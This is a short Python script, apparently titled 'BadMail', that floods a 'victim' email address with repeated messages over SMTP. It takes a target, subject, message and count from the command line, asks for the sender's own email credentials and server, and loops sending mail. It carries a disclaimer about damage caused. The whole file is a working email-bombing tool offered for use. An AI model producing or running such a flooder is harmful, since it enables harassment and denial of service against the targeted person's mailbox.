from colorama import Fore, Style, init
import smtplib as root
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os, getpass, argparse

if os.name == 'nt':
	init()
	os.system("cls")
else:
	os.system("clear")

print(f"""{Fore.GREEN}
		                    _________
	                           /         /.
	    .-------------.       /_________/ |
	   /             / |      |         | |
	  /+============+\\ |      | |====|  | |
	  ||BadMail     || |      |         | |
	  ||            || |      | |====|  | |
	  ||            || |      |   ___   | |
	  ||            || |      |  |166|  | |
	  ||            ||/@@@    |   ---   | |
	  \\+============+/    @   |_________|./.
	                     @          ..  ....'
	  ..................@     __.'.'  ''
	 /oooooooooooooooo//     ///
	/................//     /_/
	------------------
	Art from: https://textart.io
	The author is not responsible for the damage caused by this program
                                Coded by {Fore.YELLOW}ToxidWorm
                                               {Style.RESET_ALL}""")

parser = argparse.ArgumentParser(description='Badmail help')
parser.add_argument("--message", type=str, help="Mail message")
parser.add_argument("--subject", type=str, help="Mail subject")
parser.add_argument("--threads", type=int, help="Messages count")
parser.add_argument("--target", type=str, help="Victim email")

args = parser.parse_args()

def send_mail():
	login = input(f'{Fore.CYAN}Enter your email: ')
	password = getpass.getpass(prompt=f'{Fore.CYAN}Enter your password from email: ', stream=None) 
	url = input(f'{Fore.CYAN}URL: ')
	toaddr = args.target
	topic = args.subject
	message = args.message
	num = args.threads

	for value in range(int(num)):
		msg = MIMEMultipart()

		msg['Subject'] = topic
		msg['From'] = login
		body = message
		msg.attach(MIMEText(body, 'plain'))
	
		server = root.SMTP_SSL(url, 465)
		server.login(login, password)
		server.sendmail(login, toaddr, msg.as_string())

		value += 1

		print(f'{Fore.GREEN}[+] {Fore.CYAN}Sended: ' + str(value))

def main():
	send_mail()

if __name__ == '__main__':
	main()